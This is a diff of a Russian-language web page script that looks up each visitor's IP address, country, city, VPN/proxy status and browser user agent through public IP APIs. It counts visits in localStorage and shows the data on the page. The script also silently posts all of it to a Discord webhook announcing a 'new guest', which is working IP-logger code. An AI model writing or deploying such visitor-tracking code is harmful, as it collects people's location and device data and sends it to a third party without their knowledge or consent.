@@ -46,67 +46,66 @@
     const visitedKey = "gojo-visits";
 
     async function getIPData() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        return await res.json();
-      } catch (err) {
-        console.error("Ошибка API:", err);
-        return {};
-      }
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    } catch (e) {
+      // Резервный API
+      const alt = await fetch("https://ipwho.is/");
+      return await alt.json();
+    }
+  }
+
+  async function main() {
+    const data = await getIPData();
+
+    const ip = data.ip || "Неизвестно";
+    const country = data.country_name || data.country || "Неизвестно";
+    const city = data.city || "Неизвестно";
+    const vpn = data.security?.vpn ? "Да" : "Нет";
+    const proxy = data.security?.proxy ? "Да" : "Нет";
+    const userAgent = navigator.userAgent;
+
+    const visits = parseInt(localStorage.getItem("visits") || "0") + 1;
+    localStorage.setItem("visits", visits);
+
+    const ips = JSON.parse(localStorage.getItem("ips") || "[]");
+    if (!ips.includes(ip)) {
+      ips.push(ip);
+      localStorage.setItem("ips", JSON.stringify(ips));
     }
 
-    function logToDiscord(message) {
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
-      }).catch(e => console.error("Ошибка Discord Webhook:", e));
-    }
-
-    async function main() {
-      const data = await getIPData();
-      const ip = data.ip || "undefined";
-      const country = data.country_name || "undefined";
-      const city = data.city || "undefined";
-      const isVPN = data.security?.vpn ? "Да" : "Нет";
-      const isProxy = data.security?.proxy ? "Да" : "Нет";
-      const device = navigator.userAgent;
-
-      const visits = parseInt(localStorage.getItem(visitedKey) || "0") + 1;
-      localStorage.setItem(visitedKey, visits);
-
-      let knownIPs = JSON.parse(localStorage.getItem(storageKey) || "[]");
-      if (!knownIPs.includes(ip)) {
-        knownIPs.push(ip);
-        localStorage.setItem(storageKey, JSON.stringify(knownIPs));
-      }
-
-      document.getElementById("info").innerText = `
+    document.getElementById("info").innerText = `
 🔎 IP: ${ip}
 🌍 Страна: ${country}
 🏙 Город: ${city}
-🔒 VPN: ${isVPN}
-🧰 Прокси: ${isProxy}
-📱 Устройство: ${device}
+🔒 VPN: ${vpn}
+🧰 Прокси: ${proxy}
+📱 Устройство: ${userAgent}
+👁️ Уникальных гостей: ${ips.length}
+🧾 Переходов с устройства: ${visits}
+    `;
 
-👁️ Уникальных гостей: ${knownIPs.length}
-🧾 Всего переходов: ${visits}
-      `;
-
-      logToDiscord(`
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `
 🔎 **Новый гость на сайте!**
 **IP:** ${ip}
 **Страна:** ${country}
 **Город:** ${city}
-**VPN:** ${isVPN}
-**Прокси:** ${isProxy}
-**Устройство:** ${device}
-**👁️ Уникальных гостей:** ${knownIPs.length}
-**🧾 Переходов с устройства:** ${visits}
-      `);
-    }
+**VPN:** ${vpn}
+**Прокси:** ${proxy}
+**Устройство:** ${userAgent}
+👁️ **Уникальных гостей:** ${ips.length}
+🧾 **Переходов с устройства:** ${visits}
+        `
+      })
+    });
+  }
 
-    main();
-  </script>
+  main();
+</script>
 </body>
 </html>
